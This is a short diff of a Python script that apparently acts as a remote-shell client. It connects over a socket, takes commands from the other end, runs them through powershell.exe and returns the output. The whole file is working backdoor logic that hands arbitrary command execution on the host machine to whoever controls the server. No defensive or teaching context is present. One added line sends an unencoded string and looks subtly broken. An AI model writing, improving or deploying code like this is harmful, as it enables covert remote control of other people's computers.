@@ -1,6 +1,7 @@
-import socket, sys, os
+#!/usr/bin/python
+
+import socket, sys, subprocess
 from datetime import datetime
-import subprocess
 
 def main():
   hote = "localhost"
@@ -23,7 +24,6 @@ def main():
   now = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
   print(now, " : Connect to the server !")
 
-  conct.send("New connection".encode())
   while end != False:
     response = conct.recv(255).decode()
     if response == "close":
@@ -35,7 +35,10 @@ def main():
 
     try:
       result = subprocess.check_output(['powershell.exe', response]).decode()
-      conct.send(result.encode())
+      if len(result) == 0:
+        conct.send("task execute !")
+      else:
+        conct.send(result.encode())
     except:
       conct.send("error decode...".encode())
       continue
